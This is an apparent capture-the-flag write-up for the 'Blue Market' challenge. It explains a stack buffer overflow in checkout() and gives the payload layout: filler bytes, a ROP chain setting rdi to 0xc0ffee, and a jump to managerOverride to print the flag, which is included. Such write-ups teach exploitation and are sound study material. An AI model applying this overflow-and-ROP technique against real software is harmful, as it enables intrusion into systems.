# Blue Market

`nc blue-market.wolvctf-2026.kctf.cloud 1337`

## Bug

`checkout()` reads `0x100` bytes into a 64-byte stack buffer. The extra bytes run past the buffer and overwrite the saved return address. We control where the program goes after `checkout()` ends.

## Exploit

Send 0x40 filler bytes, 8 bytes for saved RBP, then a ROP chain. `pop rdi; ret` sets `rdi = 0xc0ffee`. One `ret` fixes stack alignment. `managerOverride` then prints the flag. That function only decrypts `"flag.txt"` correctly when `rdi == 0xc0ffee`.

```text
'A' * 0x40
'B' * 8
0x401182   pop rdi; ret
0xc0ffee
0x401183   ret
0x401184   managerOverride
```

## Flag

`wctf{bluem4rket_4qtb786aidwh1etd}`
